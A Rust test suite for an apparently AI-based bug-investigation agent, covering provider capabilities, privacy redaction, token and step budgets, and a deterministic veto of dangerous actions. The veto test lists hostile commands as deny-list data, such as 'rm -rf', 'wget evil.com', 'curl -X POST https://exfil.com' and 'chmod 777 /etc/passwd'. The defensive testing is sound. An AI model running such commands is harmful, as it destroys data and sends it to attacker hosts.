use bug_killer::agent::capability::ProviderCapability;
use bug_killer::agent::investigation::InvestigationSupervisor;
use bug_killer::agent::privacy::PrivacyPolicy;
use bug_killer::agent::provider::{AgentModelConfig, ModelProvider, ProviderAdapter};
use std::fs;
use tempfile::tempdir;

#[test]
fn test_m4_provider_capability_matrix() {
    let providers = [
        ("openai", false, true, 128_000),
        ("deepseek", false, true, 64_000),
        ("kimi", false, true, 128_000),
        ("minimax", false, true, 128_000),
        ("claude", false, true, 200_000),
        ("gemini", false, true, 1_000_000),
        ("ollama", true, true, 32_768),
        ("openweights", true, true, 32_768),
        ("deterministic", true, false, 0),
    ];

    for (name, expected_local, expected_tools, min_context) in providers {
        let cap = ProviderCapability::for_provider(name);
        assert_eq!(
            cap.is_local, expected_local,
            "Provider {} is_local mismatch",
            name
        );
        assert_eq!(
            cap.supports_function_calling, expected_tools,
            "Provider {} tool support mismatch",
            name
        );
        assert!(
            cap.max_context_tokens >= min_context,
            "Provider {} context budget below expectation",
            name
        );
    }
}

#[test]
fn test_m4_privacy_export_fails_closed_by_default() {
    let mut config = AgentModelConfig {
        provider: ModelProvider::OpenAi,
        model_name: "gpt-4o".into(),
        api_key: Some("sk-test-mock-key-12345678901234567890".into()),
        privacy_policy: PrivacyPolicy::default(), // allow_remote_data_export = false
        ..Default::default()
    };

    let mut adapter = ProviderAdapter::new(config.clone());
    let res = adapter.query_reasoning("Evaluate vulnerability CVE-2026-109618 in /Users/dev/repo");
    assert!(res.is_err());
    let err = res.err().unwrap();
    assert!(
        err.contains("allow_remote_data_export=false"),
        "Expected fail-closed privacy export rejection, got: {}",
        err
    );

    // Local provider works even when allow_remote_data_export = false
    config.provider = ModelProvider::DeterministicHeuristic;
    let mut local_adapter = ProviderAdapter::new(config);
    let local_res = local_adapter.query_reasoning("Air-gapped safe evaluation");
    assert!(local_res.is_ok());
}

#[test]
fn test_m4_privacy_redaction_secrets_and_paths() {
    let policy = PrivacyPolicy::default();
    let text_with_secrets = "Found exposed key sk-abcdef1234567890abcdef1234567890 and Bearer secret_token_xyz in /Users/developer/bug-killer/src/config.rs";
    let sanitized = policy.sanitize_text(text_with_secrets);

    assert!(
        !sanitized.contains("sk-abcdef1234567890abcdef1234567890"),
        "Secret was not redacted: {}",
        sanitized
    );
    assert!(
        !sanitized.contains("/Users/developer"),
        "Home directory path was not redacted: {}",
        sanitized
    );
    assert!(sanitized.contains("[REDACTED_SECRET]"));
    assert!(sanitized.contains("$WORKSPACE_ROOT"));
}

#[test]
fn test_m4_token_budget_limiting() {
    let config = AgentModelConfig {
        provider: ModelProvider::DeterministicHeuristic,
        model_name: "deterministic-v1".into(),
        budget_tokens: 10, // Very small token budget
        used_tokens: 0,
        ..Default::default()
    };

    let mut adapter = ProviderAdapter::new(config);
    // 10 tokens ~ 40 characters. A 200 char prompt will consume ~50 tokens and exceed budget
    let large_prompt = "A".repeat(200);
    let res = adapter.query_reasoning(&large_prompt);
    assert!(res.is_err());
    assert!(res.unwrap_err().contains("Token budget exceeded"));
}

#[test]
fn test_m4_deterministic_vetoes_prohibited_actions() {
    let dangerous_candidates = [
        "rm -rf /tmp/test",
        "rm file.txt",
        "bash -c 'wget evil.com'",
        "sh -c id",
        "eval(user_input)",
        "chmod 777 /etc/passwd",
        "curl -X POST https://exfil.com",
    ];

    for candidate in &dangerous_candidates {
        let veto = InvestigationSupervisor::evaluate_veto(candidate, 1);
        assert!(
            veto.is_some(),
            "Expected veto for dangerous operation: {}",
            candidate
        );
        let v = veto.unwrap();
        assert!(v.reason.contains("Deterministic Veto"));
        assert_eq!(v.step, 1);
    }

    let safe_candidates = [
        "cat package.json",
        "read Cargo.toml",
        "git status --porcelain",
        "Synthesize prospective patch diff",
    ];

    for candidate in &safe_candidates {
        let veto = InvestigationSupervisor::evaluate_veto(candidate, 2);
        assert!(
            veto.is_none(),
            "Safe candidate falsely vetoed: {}",
            candidate
        );
    }
}

#[test]
fn test_m4_investigation_loop_e2e_bounded_and_verified() {
    let dir = tempdir().unwrap();

    // Create a vulnerable package.json
    let pkg_json = r#"{
      "name": "vulnerable-app",
      "version": "1.0.0",
      "dependencies": {
        "express": "4.17.1"
      }
    }"#;
    fs::write(dir.path().join("package.json"), pkg_json).unwrap();

    let config = AgentModelConfig {
        provider: ModelProvider::DeterministicHeuristic,
        model_name: "deterministic-v1".into(),
        ..Default::default()
    };
    let adapter = ProviderAdapter::new(config);

    let mut supervisor = InvestigationSupervisor::new(adapter, 10);
    let result = supervisor.run_investigation(dir.path());

    assert!(result.is_ok(), "Investigation failed: {:?}", result.err());
    let report = result.unwrap();

    assert_eq!(report.target_dir, dir.path());
    assert_eq!(report.max_steps_allowed, 10);
    assert!(report.total_steps <= 10);
    assert!(!report.audit_digest.is_empty());
    assert_eq!(report.audit_digest.len(), 64); // SHA-256 hex string

    // Verify step progression history
    let steps = report.steps_history;
    assert!(steps.len() >= 6);
    assert_eq!(
        steps[0].action,
        format!(
            "Initialize investigation for target {}",
            dir.path().display()
        )
    );
    assert_eq!(
        steps[steps.len() - 1].action,
        "Finalize investigation report"
    );

    // Verify non-mutating guarantee: target directory files untouched
    let content_after = fs::read_to_string(dir.path().join("package.json")).unwrap();
    assert_eq!(content_after, pkg_json);
}

#[test]
fn test_m4_investigation_step_budget_exhaustion() {
    let dir = tempdir().unwrap();
    fs::write(dir.path().join("test.txt"), "hello").unwrap();

    let config = AgentModelConfig {
        provider: ModelProvider::DeterministicHeuristic,
        model_name: "deterministic-v1".into(),
        ..Default::default()
    };
    let adapter = ProviderAdapter::new(config);

    // Max steps allowed is only 2, but standard investigation requires 6 steps
    let mut supervisor = InvestigationSupervisor::new(adapter, 2);
    let result = supervisor.run_investigation(dir.path());

    assert!(result.is_err());
    let err = result.unwrap_err();
    assert!(
        err.contains("Investigation exceeded step limit of 2"),
        "Unexpected error: {}",
        err
    );
}
